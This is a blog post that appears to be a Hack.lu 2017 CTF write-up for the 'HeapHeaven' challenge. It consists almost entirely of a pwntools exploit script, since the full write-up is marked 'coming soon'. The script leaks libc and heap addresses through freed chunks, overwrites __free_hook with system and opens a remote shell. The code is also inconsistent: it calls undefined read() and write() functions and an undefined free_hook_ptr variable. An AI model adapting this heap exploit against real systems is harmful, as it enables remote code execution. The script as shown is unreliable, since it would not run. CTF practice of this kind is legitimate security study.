---
layout: post
title: Hack.lu CTF 2017 - HeapHeaven
categories: ctf_hacklu17
keywords: "exploitation"
comments: true
authors:
    - andreafioraldi
---

... full writeup coming soon ...

```python
from pwn import *

def isPow2(x):
    return (x & (x - 1)) == 0;

def wiWaIfy(n):
    def helper(n):
        if n == 1:
            return 'wi'
        if n%2 == 1:
            return helper(n//2) + 'wi'
        else:
            return helper(n//2) + 'wa'
    q = helper(n)
    if q[-2:] == 'wa':
        q = q[:-2] + 'we'
    return q


libc_elf = ELF("./libc.so.6")

#p = process('env LD_LIBRARY_PATH=. ./HeapHeaven', shell=True)
p = remote("flatearth.fluxfingers.net", 1743)

#alloc
def whaa(num):
    p.recvuntil("NOM-NOM\n")
    p.sendline("whaa!")
    p.recvline()
    p.sendline(wiWaIfy(num))

#read
def mommy(num):
    p.recvuntil("NOM-NOM\n")
    p.sendline("mommy?")
    p.sendline(wiWaIfy(num))
    p.recvuntil("darling: ")
    return p.recvline(False)

#write
def spill(num, val):
    p.recvuntil("NOM-NOM\n")
    p.sendline("<spill>")
    p.recvline()
    p.sendline(wiWaIfy(num))
    p.recvuntil("darling!\n")
    p.sendline(val)

#free
def nom_nom(num):
    p.recvuntil("NOM-NOM\n")
    p.sendline("NOM-NOM")
    p.sendline(wiWaIfy(num))


#phase 1 - libc leak
whaa(0x80)
whaa(0x80)
nom_nom(0x20)
r = mommy(0x20)

while len(r) < 8:
    r += "\0"
arena = u64(r)
#0x3c4b78 arena offset
libc = arena - 0x3c4b78
print "Arena: %lx" % arena
print "Libc: %lx" % libc

nom_nom(0x20+0x90) #to clean

#phase 2 - happa leak
whaa(0x60) #A
whaa(0x60) #B
whaa(0x80) #C

nom_nom(0x90) #B
nom_nom(0x20) #A
nom_nom(0x90) #B

r = read(0x20) #A
while len(r) < 8:
    r += "\0"
happa = u64(r) - 0x80
print "Happa: %lx" % happa

#phase 3 - overwrite libc's free_hook (cause GOT is rdonly!)
free_hook = libc + libc_elf.symbols["__free_hook"]

print "free_hook_ptr: %lx" % free_hook_ptr 

off = (free_hook_ptr - happa)
print "Offset: %lx" % off

import math
addr = wiWaIfy(off)

write(addr, p64(libc + libc_elf.symbols["system"]))
write(0x20, "/bin/sh\x00") #A

p.sendline("NOM-NOM")
p.sendline(0x20) #A -- open shell

p.interactive()

```
